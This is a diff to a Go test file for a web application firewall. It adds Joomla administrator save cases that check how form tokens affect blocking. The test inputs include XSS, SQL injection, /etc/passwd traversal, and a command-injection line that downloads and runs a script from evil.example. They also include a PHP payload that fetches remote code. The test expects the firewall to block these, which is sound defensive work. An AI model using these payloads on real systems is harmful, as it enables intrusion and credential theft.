@@ -2,6 +2,7 @@ package waf
 
 import (
 	"fmt"
+	"net/url"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -172,6 +173,15 @@ func TestAdminAreaSavesWithoutRuleRemoval(t *testing.T) {
 	own := []string{joomla, "Sec-Fetch-Site: same-origin", "Referer: https://joomla.example.ir/administrator/index.php?option=com_rsmembership"}
 	template := "jform%5Bemail_body%5D=" + urlEncode(`<p onclick="track()">Your membership is active.</p><script>window.dataLayer=window.dataLayer||[];</script>`)
 	file := "content=" + urlEncode(`<?php defined('_JEXEC') or die; echo '<script src="/media/site.js"></script>'; system('ls'); ?>`)
+	token := "0123456789abcdef0123456789abcdef=1"
+	htmaker := "task=apply&custhead=" + urlEncode("RewriteCond %{HTTP_USER_AGENT} (wget|curl|python-requests|libwww-perl) [NC]\nRewriteRule .* - [F]") +
+		"&exceptionfiles=" + urlEncode("administrator/components/com_akeebabackup/restore.php\nkickstart.php") +
+		"&exceptiondirs=" + urlEncode("cli\nbin\ntmp") + "&httpsurls=&cgibin=" + urlEncode("/usr/local/cgi-bin/php.cgi") +
+		"&custfoot=" + urlEncode("php_value upload_max_filesize 64M\nAddHandler application/x-httpd-ea-php82 .php")
+	globalCfg := "jform%5Bsendmail%5D=" + urlEncode("/usr/sbin/sendmail") + "&jform%5Blog_path%5D=" + urlEncode("/home/joomlash/public_html/administrator/logs") +
+		"&jform%5Boffline_message%5D=" + urlEncode(`<p>Back soon</p><script>alert(1)</script>`) + "&task=application.apply&" + token
+	attack := url.Values{"q": {"<script>alert(document.cookie)</script>"}, "id": {"1' UNION SELECT user,password FROM users-- -"},
+		"file": {"../../../../etc/passwd"}, "cmd": {";cat /etc/passwd; wget http://evil.example/x.sh -O /tmp/x; sh /tmp/x"}}.Encode()
 	cases := []struct {
 		name, host, uri, body string
 		hdr                   []string
@@ -200,6 +210,17 @@ func TestAdminAreaSavesWithoutRuleRemoval(t *testing.T) {
 		// the attack tools send it).
 		{"Front-end code injection", "joomla.example.ir", "/index.php?option=com_content&view=featured&format=feed", "x=" + urlEncode(`{source}<?=file_put_contents('a.php',file_get_contents('https://evil.example/x'));?>{/source}`), nil, 403},
 		{"Customer dashboard is not an admin area", "smm.example.pk", "/dashboard/profile", template, []string{"Cookie: PHPSESSID=abc", "Sec-Fetch-Site: same-origin", "Referer: https://smm.example.pk/dashboard/"}, 403},
+		// joomlashares.com (business600, LiteSpeed, 2026-10-27/28): saves
+		// refused with the header lifts in place. Joomla's form token alone
+		// (no Sec-Fetch-Site, no Referer) lifts the threshold.
+		{"Admin Tools .htaccess Maker without same-site headers", "joomla.example.ir", "/administrator/index.php?option=com_admintools&view=htaccessmaker", htmaker + "&" + token, []string{joomla}, 200},
+		{"The same without the form token", "joomla.example.ir", "/administrator/index.php?option=com_admintools&view=htaccessmaker", htmaker, []string{joomla}, 403},
+		{"Global Configuration without same-site headers", "joomla.example.ir", "/administrator/index.php?option=com_config", globalCfg, []string{joomla}, 200},
+		{"File Explorer save without same-site headers", "joomla.example.ir", "/administrator/?option=com_ffexplorer", file + "&task=save&" + token, []string{joomla}, 200},
+		{"A token-shaped field on the front end", "joomla.example.ir", "/index.php?option=com_content&view=featured&format=feed",
+			"x=" + urlEncode(`{source}<?=file_put_contents('a.php',file_get_contents('https://evil.example/x'));?>{/source}`) + "&" + token, nil, 403},
+		{"A token-shaped field in another admin file", "joomla.example.ir", "/administrator/components/com_x/upload.php", htmaker + "&" + token, nil, 403},
+		{"An attack tool posting to the administrator with a token-shaped field", "joomla.example.ir", "/administrator/index.php", attack + "&" + token, nil, 403},
 	}
 	for _, c := range cases {
 		if got := sendBody(t, c.host, "POST", c.uri, form, c.body, c.hdr...); (got == 403) != (c.want == 403) || got == 0 {
